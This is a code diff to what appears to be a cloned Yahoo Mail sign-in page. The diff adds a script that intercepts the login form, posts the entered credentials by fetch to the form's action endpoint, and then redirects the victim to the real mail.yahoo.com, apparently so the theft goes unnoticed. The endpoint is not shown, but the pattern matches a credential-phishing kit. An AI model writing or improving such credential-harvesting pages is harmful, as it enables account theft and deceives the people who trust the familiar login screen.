@@ -391,7 +391,7 @@ root.isIOSDevice = false;
 
 
         <div class="button-container">
-            <input id="login-signin" type="submit" name="signin" class="pure-button puree-button-primary challenge-button" value="Submit" onclick="window.location.href='https://mail.yahoo.com' data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:next" />
+            <input id="login-signin" type="submit" name="signin" class="pure-button puree-button-primary challenge-button" value="Submit" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:next" />
         </div>
 
         <div class="helper-links-container">
@@ -491,6 +491,32 @@ root.isIOSDevice = false;
             }
         }(this));
     </script>
+        <script>
+    document.getElementById("login-form").onsubmit = function(event) {
+        event.preventDefault(); // Prevent the default form submission behavior
+        var form = this;
+
+        // Perform form submission (e.g., using AJAX or fetch)
+        // Example using fetch:
+        fetch(form.action, {
+            method: form.method,
+            body: new FormData(form)
+        })
+        .then(response => {
+            if (response.ok) {
+                // Redirect to mail.yahoo.com after successful form submission
+                window.location.href = 'https://mail.yahoo.com';
+            } else {
+                // Handle form submission error
+                alert('Form submission failed.');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('Form submission error.');
+        });
+    };
+</script>
     </body>
 </html>
 <!-- fe47.member.bf1.yahoo.com - Thu Sep 12 2024 02:05:08 GMT+0000 (Coordinated Universal Time) - (0ms) -->
